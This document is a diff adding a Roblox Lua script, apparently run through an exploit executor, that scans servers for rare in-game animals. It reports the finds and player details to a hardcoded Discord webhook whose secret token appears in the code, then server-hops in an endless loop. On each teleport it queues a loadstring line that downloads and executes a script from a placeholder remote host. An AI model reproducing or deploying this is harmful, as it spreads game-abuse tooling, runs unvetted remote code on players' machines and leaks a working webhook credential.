@@ -1,0 +1,162 @@
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+
+local webhookUrl = "https://discord.com/api/webhooks/1401672811004690494/PaTA-0IuiX2naLAz4eNb9bL6gWJ3uzH_WpTPyShV38JlcEMOef6Op3iq0gYDrphYXsBP"
+local placeId = game.PlaceId
+local jobId = game.JobId
+local playerName = LocalPlayer.Name
+
+local animals = {
+    ["Pot Hotspot"] = true, ["Torrtuginni Dragonfrutini"] = true, ["Lucky Block"] = true,
+    ["Garama and Madundung"] = true, ["La Grande Combinazione"] = true, ["Graipuss Medussi"] = true,
+    ["Las Tralaleritas"] = true, ["Los Tralaleritos"] = true, ["Sammyni Spiderini"] = true,
+    ["La Vacca Saturno Saturnita"] = true
+}
+
+local function SendMessageEMBED(url, embed)
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text
+                },
+                ["thumbnail"] = embed.thumbnail and { url = embed.thumbnail } or nil,
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }
+        }
+    }
+
+    local body = HttpService:JSONEncode(data)
+    (request or http_request or syn.request)({
+        Url = url,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body
+    })
+end
+
+local foundAnimals = {}
+
+for _, plot in pairs(Workspace.Plots:GetChildren()) do
+    local animalPodiums = plot:FindFirstChild("AnimalPodiums")
+    if animalPodiums then
+        for _, podium in pairs(animalPodiums:GetChildren()) do
+            local overhead = podium:FindFirstChild("Base")
+                and podium.Base:FindFirstChild("Spawn")
+                and podium.Base.Spawn:FindFirstChild("Attachment")
+                and podium.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
+
+            if overhead and overhead:IsA("BillboardGui") then
+                local displayNameLabel = overhead:FindFirstChild("DisplayName")
+                local generationLabel = overhead:FindFirstChild("Generation")
+                local mutationLabel = overhead:FindFirstChild("Mutation")
+                local rarityLabel = overhead:FindFirstChild("Rarity")
+
+                if displayNameLabel and animals[displayNameLabel.Text] then
+                    table.insert(foundAnimals, {
+                        displayName = displayNameLabel.Text,
+                        generation = generationLabel and generationLabel.Text or "Unknown",
+                        mutation = mutationLabel and mutationLabel.Text or nil,
+                        rarity = rarityLabel and rarityLabel.Text or "Unknown"
+                    })
+                end
+            end
+        end
+    end
+end
+
+if #foundAnimals > 0 then
+    local descriptionLines = {}
+    for _, animal in ipairs(foundAnimals) do
+        local line = string.format("**%s** - Gen: `%s` | 💎 %s%s",
+            animal.displayName,
+            animal.generation,
+            animal.rarity,
+            animal.mutation and (" | 🧪 " .. animal.mutation) or "")
+        table.insert(descriptionLines, line)
+    end
+
+    local playerNames = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        table.insert(playerNames, plr.Name)
+    end
+
+    local embed = {
+        title = "🌟 Rare Animal(s) Detected",
+        description = table.concat(descriptionLines, "\n\n"),
+        color = 0xffd700,
+        thumbnail = "https://i.imgur.com/fZHvDgw.png",
+        fields = {
+            {
+                name = "🔁 Teleport Command",
+                value = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)\n```", placeId, jobId)
+            },
+            {
+                name = "🔗 Server Info",
+                value = string.format("Players: `%d/%d`\nServer ID: `%s`", #Players:GetPlayers(), Players.MaxPlayers, jobId)
+            },
+            {
+                name = "👤 Current User",
+                value = playerName
+            },
+            {
+                name = "📎 Join Server",
+                value = string.format("[Click to Join](https://www.roblox.com/games/%d/--?jobId=%s)", placeId, jobId)
+            },
+            {
+                name = "💻 Script Version",
+                value = "v4.0"
+            }
+        },
+        footer = { text = "Astral Notifier ✨" }
+    }
+
+    SendMessageEMBED(webhookUrl, embed)
+end
+
+local function ServerHop()
+    local servers = {}
+    local cursor = ""
+    local currentJobId = game.JobId
+
+    while cursor ~= nil and task.wait(0.3) do
+        local response = (request or http_request or syn.request)({
+            Url = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true&cursor=%s"):format(placeId, cursor),
+            Method = "GET"
+        })
+
+        if response and response.Success then
+            local data = HttpService:JSONDecode(response.Body)
+            for _, server in ipairs(data.data) do
+                if tonumber(server.playing) < 7 and server.id ~= currentJobId then
+                    table.insert(servers, server.id)
+                end
+            end
+            cursor = data.nextPageCursor
+            if #servers > 0 then break end
+        else
+            break
+        end
+    end
+
+    if #servers > 0 then
+        local targetServer = servers[math.random(1, #servers)]
+        queue_on_teleport([[
+            loadstring(game:HttpGet("https://yourserver.com/your_script.lua"))()
+        ]])
+        TeleportService:TeleportToPlaceInstance(placeId, targetServer, LocalPlayer)
+    end
+end
+
+task.spawn(function()
+    while task.wait(1) do
+        ServerHop()
+    end
+end)
